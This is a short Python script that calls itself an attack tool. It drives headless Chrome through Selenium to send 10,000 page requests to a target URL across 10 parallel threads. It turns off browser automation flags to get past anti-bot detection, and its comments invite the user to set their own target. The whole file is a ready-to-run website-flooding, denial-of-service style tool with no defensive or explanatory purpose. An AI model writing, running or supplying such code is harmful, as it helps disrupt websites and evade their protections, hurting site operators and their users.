from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
import threading
import time

# ✅ Setup Chrome Browser with Anti-Bot Bypass
chrome_options = Options()
chrome_options.add_argument("--headless")  # Background mode
chrome_options.add_argument("--disable-blink-features=AutomationControlled")
chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
chrome_options.add_experimental_option("useAutomationExtension", False)

# ✅ Start Attack Function
def attack(url, total_requests):
    service = Service("/usr/local/bin/chromedriver")  # ✅ Path ঠিক করে দাও  # ✅ Change this to your chromedriver path
    driver = webdriver.Chrome(service=service, options=chrome_options)

    for _ in range(total_requests):
        try:
            driver.get(url)
            print(f"🔥 Attack Sent to {url}")
            time.sleep(0.5)
        except Exception as e:
            print(f"❌ Failed: {e}")
    
    driver.quit()

# ✅ Multi-Threaded Attack
def start_attack(url, total_requests, threads):
    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=attack, args=(url, total_requests // threads))
        thread_list.append(thread)
        thread.start()
    
    for thread in thread_list:
        thread.join()

# ✅ Run Attack
if __name__ == "__main__":
    target_url = "https://target-website.com"  # ✅ Change this
    total_requests = 10000  # ✅ Number of total requests
    threads = 10  # ✅ Number of Threads (Parallel Attacks)
    
    start_attack(target_url, total_requests, threads)
